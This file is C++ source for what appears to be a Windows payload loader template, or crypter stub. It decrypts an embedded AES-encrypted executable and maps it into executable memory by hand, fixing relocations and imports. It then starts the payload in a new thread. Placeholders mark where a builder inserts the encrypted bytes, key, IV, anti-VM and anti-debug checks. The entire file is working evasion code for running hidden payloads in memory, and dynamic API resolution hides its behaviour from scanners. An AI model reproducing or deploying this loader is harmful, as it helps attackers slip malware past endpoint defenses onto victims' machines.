#include <iostream>
#include <vector>
#include <iomanip>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <windows.h>
#include <tchar.h>
#include <stdbool.h>
#include <random>

using namespace std;

/*Dynamic API Call Resolution Setup*/
// Function pointers for win api calls 
typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *VirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef HMODULE (WINAPI *LoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *GetProcAddress_t)(HMODULE, LPCSTR);
typedef HANDLE (WINAPI *CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
typedef BOOL (WINAPI *CloseHandle_t)(HANDLE);

/*ENTROPY*/


vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        cerr << "error creating EVP context\n";
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "error initializing decryption\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "decryption call failed\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}
void execute(const vector<unsigned char> &payload) {
    /*
    Dynamic System Call Resolution
    */
    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    
    if (!kernel32) {
        cerr << "Failed to load kernel32.dll with error: " << GetLastError() << "\n";
        cin.get();
        return;
    } else {
        cout << "Successfully loaded kernel32.dll at address: " << kernel32 << "\n";
    }

    VirtualAlloc_t pVirtualAlloc = NULL;
    VirtualFree_t pVirtualFree = NULL;
    LoadLibraryA_t pLoadLibraryA = NULL;
    GetProcAddress_t pGetProcAddress = NULL;
    CreateThread_t pCreateThread = NULL;
    WaitForSingleObject_t pWaitForSingleObject = NULL;
    CloseHandle_t pCloseHandle = NULL;
    /**/

    // Resolve each function explicitly
    pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(kernel32, "VirtualAlloc");
    if (!pVirtualAlloc) {
        cerr << "Failed to resolve VirtualAlloc with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pVirtualAlloc at address: " << (void*)pVirtualAlloc << "\n";
    }

    pVirtualFree = (VirtualFree_t)GetProcAddress(kernel32, "VirtualFree");
    if (!pVirtualFree) {
        cerr << "Failed to resolve VirtualFree with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pVirtualFree at address: " << (void*)pVirtualFree << "\n";
    }

    pLoadLibraryA = (LoadLibraryA_t)GetProcAddress(kernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        cerr << "Failed to resolve LoadLibraryA with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pLoadLibraryA at address: " << (void*)pLoadLibraryA << "\n";
    }

    pGetProcAddress = (GetProcAddress_t)GetProcAddress(kernel32, "GetProcAddress");
    if (!pGetProcAddress) {
        cerr << "Failed to resolve GetProcAddress with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pGetProcAddress at address: " << (void*)pGetProcAddress << "\n";
    }

    pCreateThread = (CreateThread_t)GetProcAddress(kernel32, "CreateThread");
    if (!pCreateThread) {
        cerr << "Failed to resolve CreateThread with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pCreateThread at address: " << (void*)pCreateThread << "\n";
    }

    pWaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(kernel32, "WaitForSingleObject");
    if (!pWaitForSingleObject) {
        cerr << "Failed to resolve WaitForSingleObject with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pWaitForSingleObject at address: " << (void*)pWaitForSingleObject << "\n";
    }

    pCloseHandle = (CloseHandle_t)GetProcAddress(kernel32, "CloseHandle");
    if (!pCloseHandle) {
        cerr << "Failed to resolve CloseHandle with error: " << GetLastError() << "\n";
        return;
    } else {
        cout << "Resolved pCloseHandle at address: " << (void*)pCloseHandle << "\n";
    }

    // Get DOS and NT Headers from the payload, e_lfanew is the offset start of the exe
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    // Validates DOS and NT Headers
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        cerr << "DOS Invalid\n";
        return;
    }
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        cerr << "NT Invalid\n";
        return;
    }

    // Memory allocation for the executable image with execute permissions  
    void* execMemory = pVirtualAlloc(
        NULL,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    // Checks that the memory allocation was successful
    if (!execMemory) {
        cerr << "VirtualAlloc failed with error code: " << GetLastError() << "\n";
        return;
    }

    // For debugging
    cout << "Memory allocation at: " << execMemory << "\n";

    // Copy the payload headers into a section of the allocated memory
    memcpy(execMemory, payload.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
    cout << "Headers copied\n";

    // Iterates over every section of the binary and copies them into a section of allocated memory
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        void* sectionDest = (void*)((BYTE*)execMemory + section->VirtualAddress);
        void* sectionSrc = (void*)((BYTE*)payload.data() + section->PointerToRawData);
        memcpy(sectionDest, sectionSrc, section->SizeOfRawData);

        cout << "Section " << section->Name << " copied to " << sectionDest << "\n";
    }

    // Process Relocations
    // PEs have a preferred base address, which will probably not match the base address returned from VirtualAlloc().
    // Need to make adjustments to the addresses of the sections relative to the new base address returned from
    // VirtualAlloc(), and the original preferred base address of the payload. The first check is to make sure that the image 
    // needs relocations. If no relocation table is present in the binary, no relocations are needed
    /*
    1. Get base relocation table
    2. Iterate over relocation entries
    3. Calculate delta
    4. Adjust addresses 
    */ 
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)execMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (relocation->VirtualAddress > 0) {
            // Diff between base address of VirtualAlloc() and preferred base address 
            uintptr_t delta = (uintptr_t)((BYTE*)execMemory - ntHeaders->OptionalHeader.ImageBase);
            int count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocEntry = (PWORD)((BYTE*)relocation + sizeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < count; i++, relocEntry++) {
                if (*relocEntry & 0xF000) { // Check for high nibble (type)
                    // Adjusting the address
                    uintptr_t* patchAddr = (uintptr_t*)((BYTE*)execMemory + relocation->VirtualAddress + (*relocEntry & 0xFFF));
                    *patchAddr += delta;
                }
            }
            relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
        }
    }

    // Process Import Table 
    // Import table allows for PEs to dynamically link functions/data from external DLLs. Addresses to the 
    // functions from the DLLs arent hard coded in the PE, just the name of the DLL and the function needed.
    // The import table entries have the name of the DLL, and pointers to arrays of import address
    // tables and name tables. 
    // Structure: 
    // IDT
    // Contains array of IMAGE_IMPORT_DESCRIPTORs which all correspond to a DLL
    // Each contain a name/relative virtual address of the DLL name, FirstThunk/relative virtual address of 
    // of the IAT, and OriginalFirstThunk/relative virtual address of the INT

    // IAT
    // Array of IMAGE_THUNK_DATAs, each containing an RVA to an IMAGE_IMPORT_BY_NAME, which contains the name
    // of the function
    // INT
    // Array of IMAGE_THUNK_DATAs, initially containing the same RVAs as the INT. After resolution, this
    // will contain the actual addresses of the imported functions  
    /*
    1. Check that import table is present
    2. Retrieve the table, get first entry, and for each entry:
        3. Load the DLL by name, using LoadLibraryA()
    
    
    */
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)execMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (importDescriptor->Name) { //Iterates over each entry in the IDT

            // Loads the DLL specified in the import table entry, verifies that it was loaded 
            char* moduleName = (char*)((BYTE*)execMemory + importDescriptor->Name);
            HMODULE module = pLoadLibraryA(moduleName);
            if (!module) {
                cerr << "Failed to load module: " << moduleName << "\n";
                return;
            }
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)execMemory + importDescriptor->FirstThunk);
            while (thunk->u1.AddressOfData) {
                // Function name from import table 
                PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((BYTE*)execMemory + thunk->u1.AddressOfData);
                
                // Function address
                FARPROC func = pGetProcAddress(module, import->Name);
                if (!func) {
                    cerr << "Failed to get address of function: " << import->Name << "\n";
                    return;
                }
                // Set the address in the import table 
                thunk->u1.Function = (uintptr_t)func;
                thunk++;
            }
            importDescriptor++;
        }
    }

    // Get the address of the entry point
    void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    cout << "Image entry point: " << entryPoint << "\n";

    // Create a new thread that starts execution at the entry point
    HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);

    if (!thread) {
        cerr << "CreateThread failed with error code: " << GetLastError() << "\n";
        pVirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }

    cout << "Thread created, waiting...\n";

    // Wait for the thread to finish
    pWaitForSingleObject(thread, INFINITE);

    // Clean up
    pCloseHandle(thread);
    pVirtualFree(execMemory, 0, MEM_RELEASE);

    cout << "Thread execution finished\n";
}

/*RAND_DEF*/
/*VM_DEF*/
/*DB_DEF*/

// Placeholders
const vector<unsigned char> ENCRYPTED = { /*ENCRYPTED_BYTES*/ };
const vector<unsigned char> KEY = { /*KEY*/ };
const vector<unsigned char> IV = { /*IV*/ };

int main() {
    /*VM_CALL*/
    /*DB_CALL*/
    vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
    
    execute(payload);

    return 0;
}
